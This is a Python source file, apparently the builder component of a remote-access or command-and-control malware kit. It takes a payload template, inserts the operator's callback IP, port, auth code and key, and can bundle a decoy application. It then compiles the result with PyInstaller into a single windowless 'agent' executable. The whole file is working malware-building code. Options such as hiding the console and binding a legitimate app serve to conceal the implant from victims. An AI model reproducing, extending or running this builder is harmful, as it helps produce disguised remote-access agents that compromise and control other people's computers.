from colorama import Fore, init
from .system import system
from .pyi_progress import run_pyinstaller_with_progress
import shutil
import os

class builder():
    def build(type, ip, port, app='null', isstaged=False):
        payload_file = "payloads/payload_staged.py" if isstaged else "payloads/payload.py"
        output_name = "agent_staged" if isstaged else "agent"
        
        try:
            with open(payload_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            content = content.replace("__ipaddr__", ip)
            content = content.replace("12345", str(port))
            content = content.replace("'authcode'", f"'{system.getdata('authcode')}'")
            content = content.replace("'RANDOM_KEY'", f"'{system.getdata('KEY')}'")
            
            if isstaged:
                content = content.replace('"PATH"', '"main.exe"')

            if app != 'null':
                content = content.replace("app.exe", app)
                content = content.replace("use_app = False", "use_app = True")
                
        except Exception as error:
            print(Fore.LIGHTRED_EX + f"[!] Error reading payload: {error}")
            input("OK")
            return

        with open("temp.py", 'w', encoding='utf-8') as file:
            file.write(content)

        try:
            if type == 'py':
                shutil.copy("temp.py", f"build/{output_name}.py")
            elif type == 'exe':
                os.makedirs('build', exist_ok=True)
                add_data_opts = []
                if app != 'null':
                    add_data_opts = [f'--add-data={app}{os.pathsep}.']
                options = [
                    'temp.py',
                    '--onefile',
                    '--noconsole',
                    '--hidden-import=plyer.platforms.win.notification',
                    '--hidden-import=plyer.platforms.win.win32',
                    '--distpath=build',
                    '--workpath=build/build',
                    '--specpath=build',
                ] + add_data_opts
                rc = run_pyinstaller_with_progress(options)
                if rc == 0:
                    if os.path.exists(f"build/{output_name}.exe"):
                        os.remove(f"build/{output_name}.exe")
                    target = os.path.join("build", "temp.exe")
                    if os.path.exists(target):
                        shutil.move(target, f"build/{output_name}.exe")
            for f in ["temp.py", "temp.spec"]:
                if os.path.exists(f): os.remove(f)
            if os.path.exists("build/temp"): shutil.rmtree("build/temp")
            system.clear_screen()
            system.printheader()
            print(Fore.LIGHTCYAN_EX + f"[+] Build Complete!")
            print(Fore.LIGHTYELLOW_EX + f"[+] /build/{output_name}.{type}")
            input('OK')
        except Exception as e:
            print(Fore.LIGHTRED_EX + f"[-] Error during build: {e}")
            input("OK")
        